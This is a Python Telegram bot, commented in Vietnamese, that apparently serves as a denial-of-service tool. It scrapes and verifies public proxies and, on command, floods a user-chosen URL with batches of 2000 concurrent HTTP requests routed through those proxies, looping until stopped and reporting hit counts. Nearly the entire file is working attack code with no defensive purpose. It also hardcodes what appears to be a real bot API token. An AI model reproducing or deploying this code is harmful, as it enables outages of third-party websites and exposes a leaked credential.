import asyncio, random, aiohttp, telebot, re, os, threading, time
from telebot import types

# --- CẤU HÌNH ---
TOKEN = "8789399696:AAFyBF1xDOW4WuOVgA_JGMgY5qntnzO7j8Q"
PROXY_FILE = "proxies.txt"
bot = telebot.TeleBot(TOKEN)
live_proxies = []
is_running = False
target = ""
success_count = 0
fail_count = 0
semaphore = asyncio.Semaphore(500)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# --- HỆ THỐNG ---
def save_to_file():
    with open(PROXY_FILE, "w") as f:
        f.write("\n".join(set(live_proxies)))

def load_from_file():
    global live_proxies
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            live_proxies = [line.strip() for line in f.readlines() if line.strip()]

# --- ENGINE QUÉT ---
async def check_proto(session, proto, p):
    try:
        async with session.get("http://httpbin.org/ip", proxy=f"{proto}://{p}", headers=HEADERS, timeout=2) as r:
            if r.status == 200: return f"{proto}://{p}"
    except: pass
    return None

async def fast_verify(session, p):
    async with semaphore:
        for proto in ['http', 'socks4', 'socks5']:
            res = await check_proto(session, proto, p)
            if res: return res
    return None

# --- ENGINE TẤN CÔNG 2000 LUỒNG ---
async def attack(target, session, proxy_string):
    try:
        # Giữ nguyên đầy đủ URL target
        async with session.get(f"http://{target}", proxy=proxy_string, headers=HEADERS, timeout=5) as resp:
            return resp.status < 400
    except: return False

async def run_dino_mode(target):
    global success_count, fail_count, is_running
    async with aiohttp.ClientSession() as session:
        while is_running:
            if not live_proxies: 
                await asyncio.sleep(1)
                continue

            tasks = [asyncio.create_task(attack(target, session, random.choice(live_proxies))) for _ in range(2000)]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res: success_count += 1
                else: fail_count += 1
            await asyncio.sleep(0.005)

# --- BOT INTERFACE ---
@bot.message_handler(commands=['start'])
def start_menu(m):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📥 Cào Proxy", callback_data="scrape"))
    kb.add(types.InlineKeyboardButton("🚀 Bắt đầu DoS", callback_data="dos"))
    kb.add(types.InlineKeyboardButton("🛑 Dừng", callback_data="stop"))
    bot.send_message(m.chat.id, "--- DINO SYSTEM READY ---", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    global is_running
    if c.data == "scrape":
        msg = bot.send_message(c.message.chat.id, "Gửi link nguồn (mỗi link 1 dòng):")
        bot.register_next_step_handler(msg, process_scrape)
    elif c.data == "dos":
        msg = bot.send_message(c.message.chat.id, "Nhập đầy đủ link mục tiêu:")
        bot.register_next_step_handler(msg, init_dino)
    elif c.data == "stop":
        is_running = False
        bot.send_message(c.message.chat.id, "🛑 Đã dừng tấn công.")

def process_scrape(m):
    links = m.text.split('\n')
    status_msg = bot.reply_to(m, "🔍 Đang quét Turbo...")
    def run_scrape():
        global live_proxies
        async def scrape_task():
            async with aiohttp.ClientSession() as session:
                for url in links:
                    try:
                        r = await session.get(url, headers=HEADERS, timeout=10)
                        text = await r.text()
                        found = list(set(re.findall(r'(\d+\.\d+\.\d+\.\d+:\d+)', text)))
                        for i in range(0, len(found), 100):
                            tasks = [fast_verify(session, p) for p in found[i:i+100]]
                            results = await asyncio.gather(*tasks)
                            for res in results:
                                if res and res not in live_proxies: live_proxies.append(res)
                            save_to_file()
                            bot.edit_message_text(f"🔍 Đang quét... \n💎 Kho: {len(live_proxies)}", m.chat.id, status_msg.message_id)
                    except: continue
        asyncio.run(scrape_task())
        bot.send_message(m.chat.id, "✅ Quét xong!")
    threading.Thread(target=run_scrape, daemon=True).start()

def init_dino(m):
    global is_running, target, success_count, fail_count
    # ĐÃ SỬA: Loại bỏ .split('/')[0] để giữ lại toàn bộ đường dẫn
    target = m.text.replace("http://", "").replace("https://", "")

    is_running = True
    success_count, fail_count = 0, 0
    status_msg = bot.send_message(m.chat.id, f"🔥 Target: {target}")
    threading.Thread(target=lambda: asyncio.run(run_dino_mode(target)), daemon=True).start()

    def update_ui():
        while is_running:
            time.sleep(3)
            try: bot.edit_message_text(f"🔥 Target: {target}\n✅ OK: {success_count}\n❌ Fail: {fail_count}", status_msg.chat.id, status_msg.message_id)
            except: pass
    threading.Thread(target=update_ui, daemon=True).start()

if __name__ == "__main__":
    load_from_file()
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(5)
